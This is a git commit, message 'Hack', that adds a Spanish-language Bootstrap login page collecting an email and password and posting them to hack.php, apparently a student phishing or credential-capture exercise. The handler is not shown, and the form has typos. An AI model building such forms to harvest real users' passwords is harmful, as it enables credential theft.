7d58477759323865fd0e7447bd8387c29f4a2823
ivannd2113 <19102011@utfv.edu.mx>
2021-06-24 15:32:33 -0500

    Hack

---
+++ formulario.php
@@ -0,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <title>Document</title>
+</head>
+<body>
+    
+<div clas="container">
+    <div class="row">
+        <div class="col-4  my-5 mx-auto">
+         
+        <form action="hack.php" method="POST">
+        <div class="form-group mb-3">
+            <input type="email" class="form-control" placecholder="correo electronico" name="correo" />
+
+
+        </div>
+
+        <div class="form-group mb-3">
+            <input type="password" class="form-control" placecholder="password" name="password" />
+
+               </div>
+        <button class="btn btn-primary form-control">
+            Iniciar sesion
+        </button>
+
+        </form>
+        
+        </div>
+
+    </div>
+
+</div>
+
+
+</body>
+</html>
